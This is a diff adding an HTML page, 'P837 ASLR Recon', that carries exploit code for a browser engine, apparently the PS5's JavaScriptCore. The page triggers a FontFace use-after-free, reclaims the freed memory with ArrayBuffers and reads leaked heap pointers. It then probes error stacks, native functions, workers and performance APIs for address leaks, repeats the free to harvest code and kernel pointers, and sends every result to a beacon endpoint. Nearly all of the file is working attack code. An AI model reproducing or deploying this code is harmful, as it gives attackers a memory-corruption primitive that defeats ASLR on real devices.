@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P837</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P837: ASLR Recon — Multi-Vector Leak Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P837-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+log('P837 ASLR Reconnaissance — hunting code pointers...','hot');
+
+/* ===== PHASE A: FontFace UAF (standard) ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('Reclaim missed, reloading...','fail');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var bu=new BigUint64Array(ab);
+  var u8=new Uint8Array(ab);
+
+  var q11=bu[11];
+  var q11lo=Number(q11&0xFFFFFFFFn);
+  var q11hi=Number(q11>>32n);
+  var Hstr='unknown',Hlo=0,Hhi=0;
+  if(q11hi>0){
+    var borrow=(q11lo<0x68)?1:0;
+    Hhi=q11hi-borrow; Hlo=(q11lo-0x68)>>>0;
+    Hstr='0x'+Hhi.toString(16)+('00000000'+Hlo.toString(16)).slice(-8);
+  }
+  var q13=bu[13];
+  var q13str='0x'+q13.toString(16).padStart(16,'0');
+
+  bn('HEAP','H='+Hstr+'|q13='+q13str+'|nz='+bestNz);
+  log('H = '+Hstr+' | q13 = '+q13str,'ok');
+
+  /* ===== PHASE B: Error.stack leak test ===== */
+  log('','');
+  log('--- Phase B: Error.stack address leak ---','hot');
+
+  var stackResults=[];
+  var hexPattern=/0x[0-9a-fA-F]{6,16}/g;
+  var addrPattern=/[0-9a-fA-F]{8,16}/g;
+
+  function testError(name,fn){
+    try{ fn(); }catch(e){
+      var s=e.stack||'';
+      var m=e.message||'';
+      var hexes=s.match(hexPattern)||[];
+      var hasAddr=hexes.length>0;
+      /* Also check for large decimal numbers that might be addresses */
+      var decPattern=/\b\d{10,}\b/g;
+      var decs=(s.match(decPattern)||[]).filter(function(d){return parseInt(d)>0x100000000;});
+      stackResults.push(name+'='+(hasAddr?'HEX:'+hexes.join(','):(decs.length?'DEC:'+decs.join(','):'clean')));
+      if(hasAddr||decs.length) log('  '+name+': FOUND! '+hexes.concat(decs).join(', '),'hot');
+      return;
+    }
+    stackResults.push(name+'=no-throw');
+  }
+
+  testError('TypeError',function(){null.x;});
+  testError('RangeError',function(){new Array(-1);});
+  testError('ReferenceError',function(){eval('noSuchVar836');});
+  testError('URIError',function(){decodeURIComponent('%');});
+  testError('SyntaxEval',function(){eval('{{{');});
+  testError('StackOverflow',function(){(function f(){f();})();});
+  testError('OOM-str',function(){var s='x';for(var i=0;i<40;i++)s+=s;});
+  testError('Proxy-revoke',function(){var p=Proxy.revocable({},{});p.revoke();p.proxy.x;});
+  testError('Symbol-toPrim',function(){var o={};o[Symbol.toPrimitive]=function(){throw new Error('trap');};+o;});
+  testError('BigInt-mix',function(){BigInt(1)+1;});
+
+  var stackSummary=stackResults.join('|');
+  bn('STACKS',stackSummary);
+  log('Stack results: '+stackResults.filter(function(s){return s.indexOf('HEX')>=0||s.indexOf('DEC')>=0;}).length+' leaks found','info');
+
+  /* Also check raw Error().stack format */
+  var rawStack='';
+  try{throw new Error('probe836');}catch(e){rawStack=e.stack||'';}
+  var rawLines=rawStack.split('\n').slice(0,5).join(' | ');
+  bn('RAW-STACK',rawLines.slice(0,300));
+  log('Stack format: '+rawLines.slice(0,200),'info');
+
+  /* ===== PHASE C: Native function toString ===== */
+  log('','');
+  log('--- Phase C: Native toString leak ---','hot');
+
+  var toStrResults=[];
+  var nativeFns=[
+    ['eval',eval],['parseInt',parseInt],['Math.sin',Math.sin],
+    ['Array.isArray',Array.isArray],['JSON.parse',JSON.parse],
+    ['Object.create',Object.create],['Date.now',Date.now],
+    ['String.fromCharCode',String.fromCharCode]
+  ];
+  for(var i=0;i<nativeFns.length;i++){
+    var nm=nativeFns[i][0],fn=nativeFns[i][1];
+    try{
+      var s=Function.prototype.toString.call(fn);
+      var hexes=s.match(hexPattern)||[];
+      toStrResults.push(nm+'='+(hexes.length?'LEAK:'+hexes.join(','):s.length+'B'));
+    }catch(e){toStrResults.push(nm+'=ERR');}
+  }
+  bn('TOSTR',toStrResults.join('|'));
+  log('toString: '+toStrResults.filter(function(s){return s.indexOf('LEAK')>=0;}).length+' leaks','info');
+
+  /* ===== PHASE D: Performance + memory API ===== */
+  log('','');
+  log('--- Phase D: Performance/Memory API ---','hot');
+
+  var perfData=[];
+  try{perfData.push('now='+performance.now());}catch(e){perfData.push('now=ERR');}
+  try{perfData.push('timeOrigin='+performance.timeOrigin);}catch(e){perfData.push('timeOrigin=N/A');}
+  try{
+    if(performance.memory){
+      perfData.push('heapUsed='+performance.memory.usedJSHeapSize);
+      perfData.push('heapTotal='+performance.memory.totalJSHeapSize);
+      perfData.push('heapLimit='+performance.memory.jsHeapSizeLimit);
+    }else perfData.push('memory=N/A');
+  }catch(e){perfData.push('memory=ERR');}
+  try{
+    if(performance.measureUserAgentSpecificMemory)
+      perfData.push('uaMemory=YES');
+    else perfData.push('uaMemory=N/A');
+  }catch(e){perfData.push('uaMemory=ERR');}
+  try{
+    var entries=performance.getEntries();
+    perfData.push('entries='+entries.length);
+    /* Check if any entry has suspicious data */
+    for(var i=0;i<Math.min(entries.length,5);i++){
+      var e=entries[i];
+      if(e.serverTiming&&e.serverTiming.length)perfData.push('serverTiming='+JSON.stringify(e.serverTiming).slice(0,100));
+    }
+  }catch(e){perfData.push('entries=ERR');}
+
+  bn('PERF',perfData.join('|'));
+  log('Perf: '+perfData.join(', '),'info');
+
+  /* ===== PHASE E: Worker test ===== */
+  log('','');
+  log('--- Phase E: Worker creation + messaging ---','hot');
+
+  var workerResult='SKIP';
+  try{
+    if(typeof Worker==='undefined'){
+      workerResult='NO_WORKER';
+      bn('WORKER',workerResult);
+    }else{
+      /* Create Worker from Blob URL */
+      var workerCode=[
+        'self.onmessage=function(e){',
+        '  var r={};',
+        '  try{r.errStack="";try{null.x;}catch(ex){r.errStack=ex.stack||"";}',
+        '  r.errHex=(r.errStack.match(/0x[0-9a-fA-F]{6,}/g)||[]).join(",");',
+        '  r.hasSAB=typeof SharedArrayBuffer!=="undefined";',
+        '  r.hasAtomics=typeof Atomics!=="undefined";',
+        '  r.selfType=typeof self;',
+        '  r.perfNow=performance.now();',
+        '  r.timeOrigin=performance.timeOrigin;',
+        '  /* Try to get memory info */',
+        '  try{if(performance.memory)r.heapUsed=performance.memory.usedJSHeapSize;}catch(ex){}',
+        '  /* Test ArrayBuffer transfer round-trip */',
+        '  if(e.data&&e.data.ab){',
+        '    var view=new Uint8Array(e.data.ab);',
+        '    r.abSize=view.length;',
+        '    r.abByte0=view[0];',
+        '    /* Transfer back */',
+        '    self.postMessage({type:"result",data:r,ab:e.data.ab},[e.data.ab]);',
+        '    return;',
+        '  }',
+        '  }catch(ex){r.error=ex.message;}',
+        '  self.postMessage({type:"result",data:r});',
+        '};'
+      ].join('\n');
+
+      var blob=new Blob([workerCode],{type:'application/javascript'});
+      var blobUrl=URL.createObjectURL(blob);
+      var w=new Worker(blobUrl);
+      URL.revokeObjectURL(blobUrl);
+
+      var workerDone=false;
+      w.onmessage=function(e){
+        if(workerDone)return;
+        workerDone=true;
+        var d=e.data&&e.data.data||{};
+        var wr=[];
+        wr.push('stack='+(d.errHex||'clean'));
+        wr.push('sab='+(d.hasSAB?'YES':'NO'));
+        wr.push('atomics='+(d.hasAtomics?'YES':'NO'));
+        wr.push('perfNow='+d.perfNow);
+        wr.push('timeOrigin='+d.timeOrigin);
+        if(d.heapUsed)wr.push('heap='+d.heapUsed);
+        if(d.abSize!==undefined)wr.push('abTransfer='+d.abSize+'B');
+        if(d.error)wr.push('err='+d.error);
+        workerResult=wr.join('|');
+        bn('WORKER',workerResult);
+        log('Worker: '+workerResult,'ok');
+        w.terminate();
+
+        /* Continue to Phase F after Worker completes */
+        runPhaseF();
+      };
+      w.onerror=function(e){
+        if(workerDone)return;
+        workerDone=true;
+        workerResult='ERROR:'+((e&&e.message)||'unknown');
+        bn('WORKER',workerResult);
+        log('Worker error: '+workerResult,'fail');
+        runPhaseF();
+      };
+
+      /* Send test message with transferable AB */
+      var testAB=new ArrayBuffer(16);
+      var tv=new Uint8Array(testAB);
+      tv[0]=0x42;
+      try{
+        w.postMessage({ab:testAB},[testAB]);
+      }catch(e){
+        w.postMessage({test:true});
+      }
+
+      /* Timeout fallback */
+      setTimeout(function(){
+        if(!workerDone){
+          workerDone=true;
+          workerResult='TIMEOUT';
+          bn('WORKER',workerResult);
+          log('Worker timed out','fail');
+          w.terminate();
+          runPhaseF();
+        }
+      },3000);
+
+      return; /* Phase F continues via callback */
+    }
+  }catch(e){
+    workerResult='CREATE_ERR:'+e.message;
+    bn('WORKER',workerResult);
+    log('Worker: '+workerResult,'fail');
+  }
+
+  runPhaseF();
+
+  function runPhaseF(){
+    /* ===== PHASE F: JSC internal object probing ===== */
+    log('','');
+    log('--- Phase F: JSC internals probe ---','hot');
+
+    var jscResults=[];
+
+    /* Test WebAssembly availability (already known NO, confirm) */
+    jscResults.push('wasm='+(typeof WebAssembly!=='undefined'?'YES':'NO'));
+
+    /* Test FinalizationRegistry */
+    jscResults.push('finReg='+(typeof FinalizationRegistry!=='undefined'?'YES':'NO'));
+
+    /* Test WeakRef */
+    jscResults.push('weakRef='+(typeof WeakRef!=='undefined'?'YES':'NO'));
+
+    /* Test globalThis properties that might expose internal addresses */
+    try{
+      var props=Object.getOwnPropertyNames(globalThis).sort();
+      var interesting=props.filter(function(p){
+        return /^[_$]|debug|internal|memory|pointer|address|native|jsc|webkit|gc/i.test(p);
+      });
+      jscResults.push('interesting=['+interesting.join(',')+']');
+    }catch(e){jscResults.push('props=ERR');}
+
+    /* Test if console.memory or console.profile exists */
+    try{
+      if(console.memory) jscResults.push('consoleMem=YES:'+JSON.stringify(console.memory).slice(0,100));
+      else jscResults.push('consoleMem=NO');
+    }catch(e){jscResults.push('consoleMem=ERR');}
+
+    /* Test description of well-known symbols */
+    try{
+      var syms=[Symbol.iterator,Symbol.toPrimitive,Symbol.hasInstance,Symbol.species];
+      var symDescs=syms.map(function(s){return String(s);});
+      jscResults.push('syms='+symDescs.join(','));
+    }catch(e){jscResults.push('syms=ERR');}
+
+    /* Test if ArrayBuffer has transfer (PS5 doesn't, confirm) */
+    jscResults.push('abTransfer='+(typeof ArrayBuffer.prototype.transfer!=='undefined'?'YES':'NO'));
+    jscResults.push('abResize='+(typeof ArrayBuffer.prototype.resize!=='undefined'?'YES':'NO'));
+
+    /* Test structuredClone */
+    jscResults.push('sClone='+(typeof structuredClone!=='undefined'?'YES':'NO'));
+
+    /* Test if we can detect heap base from multiple AB addresses */
+    /* Create 20 AB(192) and check if any have nonzero residue (CRITICAL for detecting heap zone boundaries) */
+    var probeABs=[];
+    for(var i=0;i<20;i++){
+      var pab=new ArrayBuffer(192);
+      var pbu=new BigUint64Array(pab);
+      var nz=0;
+      for(var q=0;q<24;q++)if(pbu[q]!==0n)nz++;
+      if(nz>0)probeABs.push({idx:i,nz:nz,q0:'0x'+pbu[0].toString(16)});
+    }
+    jscResults.push('residue='+probeABs.length+'/20');
+    if(probeABs.length>0){
+      jscResults.push('residueDetail='+probeABs.map(function(p){return p.idx+':'+p.nz+'q(q0='+p.q0+')';}).join(','));
+    }
+
+    bn('JSC',jscResults.join('|'));
+    log('JSC: '+jscResults.join(', '),'info');
+
+    /* ===== PHASE G: Multi-FontFace q13 comparison ===== */
+    log('','');
+    log('--- Phase G: Multi-FontFace q13 analysis ---','hot');
+
+    /* Create 8 MORE FontFace UAFs in sequence to see if q13 values overlap */
+    var multiResults=[];
+    var q13values=['0x'+q13.toString(16).padStart(16,'0')]; /* First q13 from Phase A */
+    var Hvalues=[Hstr];
+
+    function doMultiFontFace(idx, callback){
+      if(idx>=8){callback();return;}
+
+      var stM=document.createElement('style');
+      stM.textContent="@font-face{font-family:mm"+idx+";src:local(Arial);unicode-range:U+00"+(0x50+idx).toString(16)+";}"
+      document.head.appendChild(stM);
+      var fM=new FontFace('mf'+idx,"local('Helvetica')",{unicodeRange:'U+00'+(0x60+idx).toString(16)});
+      document.fonts.add(fM);
+      void fM.loaded;
+
+      var mfabs=[],mfired=false;
+      Object.defineProperty(FontFace.prototype,'then',{
+        configurable:true,
+        get:function(){
+          if(mfired)return undefined;
+          mfired=true;
+          stM.remove();stM.textContent='';
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          mfabs=[];
+          for(var j=0;j<32;j++)mfabs.push(new ArrayBuffer(192));
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}
+      });
+      document.fonts.load('1em mf'+idx+', mm'+idx,'X');
+
+      setTimeout(function(){
+        delete FontFace.prototype.then;
+        var bestJ=-1,bestJnz=0;
+        for(var j=0;j<mfabs.length;j++){
+          var uu=new Uint8Array(mfabs[j]),nnz=0;
+          for(var k=0;k<uu.length;k++)if(uu[k]!==0)nnz++;
+          if(nnz>bestJnz){bestJnz=nnz;bestJ=j;}
+        }
+        if(bestJ>=0&&bestJnz>=4){
+          var mbu=new BigUint64Array(mfabs[bestJ]);
+          var mq11=mbu[11], mq13=mbu[13];
+          var mq11lo=Number(mq11&0xFFFFFFFFn),mq11hi=Number(mq11>>32n);
+          var mHstr='unknown';
+          if(mq11hi>0){
+            var mb=(mq11lo<0x68)?1:0;
+            mHstr='0x'+(mq11hi-mb).toString(16)+('00000000'+((mq11lo-0x68)>>>0).toString(16)).slice(-8);
+          }
+          var mq13str='0x'+mq13.toString(16).padStart(16,'0');
+          Hvalues.push(mHstr);
+          q13values.push(mq13str);
+          multiResults.push('f'+idx+':H='+mHstr+'|q13='+mq13str);
+          log('  Font '+idx+': H='+mHstr+' q13='+mq13str,'ok');
+        }else{
+          multiResults.push('f'+idx+':MISS(nz='+bestJnz+')');
+          log('  Font '+idx+': miss','fail');
+        }
+        doMultiFontFace(idx+1,callback);
+      },300);
+    }
+
+    doMultiFontFace(0,function(){
+      bn('MULTI-H',Hvalues.join('|'));
+      bn('MULTI-Q13',q13values.join('|'));
+
+      /* Analyze: are any q13 values within 192 bytes of any H? */
+      var overlaps=[];
+      for(var a=0;a<q13values.length;a++){
+        var q13v=BigInt(q13values[a]);
+        for(var b=0;b<Hvalues.length;b++){
+          if(Hvalues[b]==='unknown')continue;
+          var hv=BigInt(Hvalues[b]);
+          var diff=q13v>hv?Number(q13v-hv):Number(hv-q13v);
+          if(diff<192){
+            overlaps.push('q13['+a+']↔H['+b+']:dist='+diff);
+          }else if(diff<4096){
+            overlaps.push('q13['+a+']↔H['+b+']:NEAR='+diff);
+          }
+        }
+      }
+
+      /* Also check H-to-H distances for heap layout info */
+      var hDists=[];
+      for(var a=0;a<Hvalues.length-1;a++){
+        if(Hvalues[a]==='unknown')continue;
+        var ha=BigInt(Hvalues[a]);
+        for(var b=a+1;b<Hvalues.length;b++){
+          if(Hvalues[b]==='unknown')continue;
+          var hb=BigInt(Hvalues[b]);
+          var d=Number(hb>ha?hb-ha:ha-hb);
+          hDists.push(a+'↔'+b+':'+d+'(0x'+d.toString(16)+')');
+        }
+      }
+
+      /* Check if all q13 are the same (shared object) */
+      var uniqueQ13=[];
+      for(var i=0;i<q13values.length;i++){
+        if(uniqueQ13.indexOf(q13values[i])<0)uniqueQ13.push(q13values[i]);
+      }
+
+      bn('OVERLAP',overlaps.length?overlaps.join('|'):'NONE');
+      bn('H-DIST',hDists.slice(0,10).join('|'));
+      bn('Q13-UNIQUE','count='+uniqueQ13.length+'/'+q13values.length+'|vals='+uniqueQ13.join(','));
+
+      log('','');
+      log('Overlap check: '+(overlaps.length?overlaps.join(', '):'NONE — q13 never inside any AB'),'hot');
+      log('H distances: '+hDists.slice(0,5).join(', '),'info');
+      log('Unique q13: '+uniqueQ13.length+'/'+q13values.length+(uniqueQ13.length===1?' (SHARED object — all same!)':''),'info');
+
+      /* ===== PHASE H: Deep residue scan on new AB(192)s ===== */
+      /* Allocate fresh AB(192) after all the frees — might reclaim non-CSSFontFace objects */
+      log('','');
+      log('--- Phase H: Post-UAF residue harvest ---','hot');
+
+      var harvest=[];
+      for(var i=0;i<100;i++){
+        var hab=new ArrayBuffer(192);
+        var hbu=new BigUint64Array(hab);
+        var hu8=new Uint8Array(hab);
+        var hnz=0;
+        for(var j=0;j<192;j++)if(hu8[j]!==0)hnz++;
+        if(hnz>=4){
+          /* Check for potential code pointers (0x0000_00xx_xxxx_xxxx range, non-heap) */
+          var ptrs=[];
+          for(var q=0;q<24;q++){
+            var v=hbu[q];
+            if(v===0n)continue;
+            var hi=Number(v>>32n);
+            var lo=Number(v&0xFFFFFFFFn);
+            var cls='?';
+            if(hi>=0x100&&hi<0x800)cls='HEAP';
+            else if(hi>=1&&hi<0x100)cls='CODE?'; /* potential code segment */
+            else if(hi===0&&lo>0x100000)cls='LO-CODE?'; /* low 32-bit code addr */
+            else if(hi>=0xFFFF0000)cls='KERN';
+            else if(hi===0)cls='small';
+            if(cls==='CODE?'||cls==='LO-CODE?'||cls==='KERN'){
+              ptrs.push('q'+q+'=0x'+v.toString(16).padStart(16,'0')+'['+cls+']');
+            }
+          }
+          if(ptrs.length>0){
+            harvest.push({idx:i,nz:hnz,ptrs:ptrs});
+          }
+        }
+      }
+
+      var harvestSummary='found='+harvest.length;
+      if(harvest.length>0){
+        var details=harvest.slice(0,5).map(function(h){return '#'+h.idx+':nz='+h.nz+','+h.ptrs.join('+');});
+        harvestSummary+='|'+details.join('|');
+        for(var i=0;i<Math.min(harvest.length,3);i++){
+          log('  Harvest #'+harvest[i].idx+': '+harvest[i].ptrs.join(', '),'hot');
+        }
+      }
+      bn('HARVEST',harvestSummary);
+      log('Harvest: '+harvest.length+' ABs with potential code pointers','info');
+
+      /* ===== PHASE I: Timing side channel test ===== */
+      log('','');
+      log('--- Phase I: Timer resolution ---','hot');
+
+      var times=[];
+      for(var i=0;i<20;i++){
+        var t1=performance.now();
+        var t2=performance.now();
+        times.push(t2-t1);
+      }
+      var unique=[];
+      for(var i=0;i<times.length;i++){
+        var s=times[i].toFixed(6);
+        if(unique.indexOf(s)<0)unique.push(s);
+      }
+      var minDelta=Math.min.apply(null,times.filter(function(t){return t>0;}));
+      bn('TIMER','min='+minDelta+'|unique='+unique.length+'|vals='+unique.slice(0,8).join(','));
+      log('Timer resolution: min delta='+minDelta+'ms, '+unique.length+' unique values','info');
+
+      /* ===== DONE ===== */
+      log('','');
+      log('====== P837 COMPLETE ======','hot');
+      var summary='H='+Hstr+'|q13count='+q13values.length+'|uniqueQ13='+uniqueQ13.length;
+      summary+='|overlaps='+overlaps.length+'|harvest='+harvest.length;
+      summary+='|worker='+workerResult.split('|')[0];
+      summary+='|stackLeaks='+stackResults.filter(function(s){return s.indexOf('HEX')>=0;}).length;
+      summary+='|timer='+minDelta;
+      bn('DONE',summary);
+      log('Summary: '+summary,'ok');
+    });
+  }
+
+},800);
+</script></body></html>
